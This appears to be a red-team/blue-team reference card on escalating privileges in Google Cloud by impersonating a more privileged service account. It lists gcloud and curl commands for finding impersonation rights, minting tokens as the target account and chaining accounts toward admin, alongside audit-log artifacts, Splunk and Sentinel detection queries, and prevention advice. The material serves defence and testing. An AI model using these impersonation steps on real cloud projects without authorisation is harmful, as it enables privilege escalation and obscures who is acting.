name: GCP Service Account Impersonation - getAccessToken / actAs
description: Impersonate a higher-privileged GCP service account using iam.serviceAccounts.getAccessToken (or signJwt/getOpenIdToken). With roles/iam.serviceAccountTokenCreator (or actAs) over a target SA, mint short-lived access tokens as that SA and inherit its permissions - a primary GCP privilege-escalation path that needs no key file and leaves the attacker acting as a different identity.
notes:
=== THE PRIMITIVE ===
  If you (or an SA you control) have iam.serviceAccounts.getAccessToken on a
  target SA (role roles/iam.serviceAccountTokenCreator), you can mint tokens
  AS that SA. getOpenIdToken / signJwt are related primitives.

=== FIND WHERE YOU CAN IMPERSONATE ===
  gcloud iam service-accounts list
  # who has TokenCreator on a given SA:
  gcloud iam service-accounts get-iam-policy <target>
  # project-wide view:
  gcloud projects get-iam-policy <project> --format=json

=== MINT A TOKEN AS THE TARGET SA ===
  gcloud auth print-access-token --impersonate-service-account=<target>
  # or attach impersonation to any gcloud command:
  gcloud storage ls --impersonate-service-account=<target>
  gcloud compute instances list --impersonate-service-account=<target>

=== RAW API (explicit) ===
  curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
    -H 'Content-Type: application/json' \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<target>:generateAccessToken" \
    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'

=== actAs CHAINING ===
  roles/iam.serviceAccountUser (actAs) lets you attach a privileged SA to a
  new resource (VM, function, job) that then runs as that SA - see the
  Cloud Function privesc card.

=== NEXT ===
  Chain: impersonate SA_A, which can impersonate SA_B, up to an admin SA.

defense.why_it_works: Service-account impersonation is a sanctioned GCP feature. The IAM role roles/iam.serviceAccountTokenCreator grants iam.serviceAccounts.getAccessToken, and anyone holding it over a target SA can mint short-lived tokens as that SA and inherit its roles - no key file, just an API call.
defense.prerequisites: A principal (user or SA) with roles/iam.serviceAccountTokenCreator (or actAs / serviceAccountUser for resource-attach chaining) over a more privileged target service account.
defense.impact: Privilege escalation to the target SA's permissions and lateral movement by chaining impersonation across SAs toward project owner/editor; the attacker operates under a different identity, complicating attribution.
defense.detection: [MITRE T1078.004] Cloud Audit Logs GenerateAccessToken / GenerateIdToken / SignJwt calls on iamcredentials.googleapis.com, especially new principal->target pairs or chains; impersonated tokens used from unusual IPs.
defense.artifacts: Audit log entries protoPayload.serviceName=iamcredentials.googleapis.com with methodName GenerateAccessToken/GenerateIdToken/SignJwt, authenticationInfo.principalEmail (caller) and request.name (target SA); downstream API calls attributed to the target SA.
defense.splunk_spl:
index=gcp (protoPayload.serviceName=iamcredentials.googleapis.com)
| search protoPayload.methodName="*GenerateAccessToken*" OR protoPayload.methodName="*GenerateIdToken*" OR protoPayload.methodName="*SignJwt*"
| stats count by protoPayload.authenticationInfo.principalEmail, protoPayload.request.name
defense.sentinel_kql:
GCPAuditLogs
| where ServiceName == "iamcredentials.googleapis.com"
| where MethodName has_any ("GenerateAccessToken","GenerateIdToken","SignJwt")
| summarize Count=count() by PrincipalEmail, ResourceName
defense.prevention: Grant roles/iam.serviceAccountTokenCreator and serviceAccountUser narrowly and per-SA (never at project level); prefer workload identity over keys; use IAM Recommender to strip unused impersonation rights; enable Data Access audit logs for IAM Credentials; alert on new impersonation principal/target pairs and on chains.

detections.name: Service account access-token impersonation
detections.logic:
GCPAuditLogs
| where ServiceName == "iamcredentials.googleapis.com"
| where MethodName has_any ("GenerateAccessToken","GenerateIdToken","SignJwt")
| summarize Count=count() by PrincipalEmail, ResourceName
detections.false_positives: Legitimate automation and workload-identity flows that impersonate SAs
detections.tuning: Baseline normal caller->target impersonation pairs; alert on new pairs, cross-project targets, or impersonation chains
